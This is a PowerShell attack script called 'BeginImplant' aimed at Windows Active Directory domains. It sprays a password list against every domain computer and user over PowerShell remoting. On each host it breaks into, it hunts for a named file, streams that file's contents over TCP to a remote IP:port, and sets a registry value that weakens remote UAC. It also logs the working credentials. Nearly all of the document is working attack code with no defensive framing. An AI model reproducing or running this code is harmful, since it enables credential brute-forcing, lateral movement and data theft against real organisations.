Import-Module ActiveDirectory

function BeginImplant{
param([Parameter(Mandatory=$true)] [string] $PassList,
[Parameter(Mandatory=$true)] [string] $FileName,
[Parameter(Mandatory=$true)] [string] $Target,
[Parameter(Mandatory=$false)] [string] $LogString
)
    $filePath = Resolve-Path "logfile.txt"
    Get-ChildItem $filePath | Remove-Item -Recurse
    New-Item -Path . -Name $LogString+".txt" -ItemType "file" -Value "Usernames and passwords:"
    $complist = Get-ADComputer -filter * 
    Write-Output $complist
    $pass_list = Get-Content $PassList
    Write-Output $pass_list
    $user_list = Get-ADUser -Filter *
    Write-Output $user_list

    $complist | ForEach-Object{
        $comp = $_
        $user_list | ForEach-Object{
            $user = $_
            $user = $user.name
            $pass_list | ForEach-Object{
                $rootdse = Get-ADRootDSE
                $context = Get-ADObject $rootdse.defaultNamingContext
                $pass = $_ 
                $user2 = $context.name + '\'+ $user
                Write-Output $user2
                Write-Output $pass
                $pass = $pass | ConvertTo-SecureString -AsPlainText -Force
                $cred = New-Object System.Management.Automation.PSCredential($user2, $pass)
                $session = New-PSSession -ComputerName $comp.DNSHostName -Credential $cred -ErrorAction Ignore
                if($session) {
                    $cmd = Invoke-Command -ComputerName $comp.DNSHostName -ErrorAction SilentlyContinue -Credential $cred -ScriptBlock {
                        param($_Target, $_FileName)
                        Write-Output $_Target
                        Write-Output $_FileName
                        $fileArray = Get-ChildItem -Path C:\ -Filter $_FileName -Force -Recurse
                        $fileArray | ForEach-Object{
                            Write-Output "found"
                            
                            $content = Get-Content $_.FullName
                            $Target_IP, $Target_Port = $_Target.split(':')
                            $socket = New-Object Net.Sockets.TcpClient($Target_IP, $Target_Port) -ErrorAction Continue
                            $tcpStream = $socket.GetStream()
                            $writer = New-Object System.IO.StreamWriter($tcpStream)
                            $writer.AutoFlush = $true
                            $writer.WriteLine($content)
                            $Registry_Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
                            $name = "LocalAccountTokenFilterPolicy"
                            $value = "1"
                            if (Test-Path $Registry_Path){
                                New-Item -Path $Registry_Path -Force
                                New-ItemProperty -Path $Registry_Path -Value $value -Name $name -PropertyType string -Force

                                }
                            ELSE{
                                Write-Output "Writing Key"
                                New-ItemProperty -Path $Registry_Path -Value $value -Name $name -PropertyType string -Force
                            }

                            
                            
                        }
                       
                        
                    } -ArgumentList $Target,$FileName
                    Write-Output $cmd
                    $credString = "`r`n"+"username: "+$user2+"  password: "+$pass
                    Add-Content .\logfile.txt $credString
                    }
                Write-Output $session
                }
                #Test cmd: BeginImplant PassList.txt TargetFile.txt 10.1.0.1 logFile
                #import cmd: Import-Module .\BeginImplant.ps1
            }
        }
    }

